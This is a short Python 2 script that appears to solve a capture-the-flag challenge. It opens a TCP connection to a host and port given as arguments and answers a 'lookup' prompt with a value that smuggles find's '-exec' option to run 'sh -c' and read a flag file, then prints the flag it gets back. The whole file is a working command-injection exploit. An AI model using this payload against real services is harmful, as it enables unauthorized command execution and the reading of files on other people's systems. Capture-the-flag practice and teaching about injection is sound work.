import socket
from sys import argv

def findfile(IPaddr, port):
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))
	
	while 1:
		output = s.recv(1024)
		if "lookup" in output:
			s.sendall("'*' -exec find flag {} + -exec sh -c 'cat flag' {} +"+'\n')
		elif "FLAG" in output:
			pos = output.find("FLAG")
			print output[pos:]
		elif not output:
			break
		

findfile(argv[1], argv[2])
